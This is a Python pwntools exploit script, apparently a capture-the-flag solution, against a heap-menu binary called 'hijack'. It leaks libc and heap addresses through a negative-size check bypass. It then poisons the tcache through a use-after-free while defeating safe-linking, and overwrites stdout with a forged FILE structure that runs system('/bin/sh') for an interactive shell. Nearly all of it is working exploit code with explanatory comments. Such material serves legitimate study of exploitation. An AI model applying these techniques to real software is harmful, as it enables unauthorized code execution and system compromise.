#!/usr/bin/python
from pwn import *
import os

os.chdir('../public')

elf = context.binary = ELF("hijack", checksec=False)
libc = elf.libc
context.terminal = ['kitty', '@', 'launch', '--cwd', 'current', '--location', 'hsplit', '--title', 'DEBUG']
gs = '''
init-pwndbg
c
'''

# wrapper functrns
def sl(x): r.sendline(x)
def sla(x, y): r.sendlineafter(x, y)
def se(x): r.send(x)
def sa(x, y): r.sendafter(x, y)
def ru(x): return r.recvuntil(x)
def rl(): return r.recvline()
def cl(): return r.clean()
def uu64(x): return u64(x.ljust(8, b'\x00'))
def uuu(x): return unhex(x[2:])

# Safelinking functions [https://github.com/mdulin2/mangle/]
def protect_ptr(target, addr):
	return (addr >> 12) ^ target

def reveal_ptr(mangled_ptr, addr):
	return protect_ptr(mangled_ptr, addr)

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

def logbase(): log.info(f'Libc base: {libc.address:#x}')

def log_addr(name, address):
    log.info('{}: {:#x}'.format(name, (address)))

def run():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.R:
        HOST = args.R.split(':')[0]
        PORT = args.R.split(':')[1]
        return remote(HOST, PORT)
    else:
        return process(elf.path)

r= run()

# =-=- heap helpers ---
idx = 0

def create(size, data):
    global idx
    sla(b'menu: ', b'1')
    sla(b'name size: ', str(size).encode())
    sla(b'chars): ', data)    
    idx += 1
    return idx - 1

def delete(idx):
    sla(b'menu: ', b'2')
    sla(b'delete: ', str(idx).encode())

def edit(idx, new_data):
    sla(b'menu: ', b'3')
    sla(b'edit: ', str(idx).encode())
    sla(b'chars): ', new_data)

def view(idx):
    sla(b'menu: ', b'4')
    sla(b'view: ', str(idx).encode())


# =-=-=- Leaks =-=-=-=-
# bypass check using negative number to get libc leak and heap leak
# in one go because of largebin fd / bk and skiplist fd / bk ??
big = create(-32740, b'big')
leak_guard = create(0x18, b'leak')

# free into unsortedbin for libc leak
delete(big)

# this will be our leak chunk
guard = create(0xe8, b'guarddd')

# create overlapping chunk that will include heap pointer 
delete(leak_guard)

# leak libc and leak together
view(guard)

# log leak
ru(b'guarddd\n')
libc.address = u64(r.recv(8)) - (libc.sym.main_arena + 0x7b0)
heap_base = u64(r.recv(8)) - 0x290
logbase()
log_addr('Heap base: ', heap_base)

# =-=-=-=-=- Use after Free =-=-=-=
# We will modify the forward pointer of a freed chunk to point to the address of 
# stdout and overwrite it with a fake filestruct that will hijack control flow

# create one more 0xf0-sized chunk to fix tc_count later and delete
fix_count = create(0xe8, b'fixcount')
delete(fix_count)

# free guard to fix tc_count
delete(guard)

# Overwrite guard fd with our ptr to stdout. Needs to be 0x10-aligned
# Needs to account for safe linking by "protecting" new fd value
edit(guard, p64(protect_ptr(libc.sym._IO_2_1_stdout_, heap_base + 0x2a0)))

# Move ptr to stdout to head of bin
junk1 = create(0xe8, b'junk1111')

# =-=-= FSOP - hijack =-=-=-=-=

# some constants
stdout_lock = libc.sym._IO_stdfile_1_lock
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps'] - 0x18
gadget = libc.address + 0x1484a0 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end = libc.sym['system']	# the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end = u64(b'/bin/sh\x00')	# will be at rdi+0x10
fake._lock = stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200		    # _wide_data just need to points to empty zone
fake.unknown2 = p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

# overwrite stdout with fake fp
# this will trigger because menu is printed after create()
fake_fp = create(0xe8, bytes(fake))

# ====================================
r.interactive()
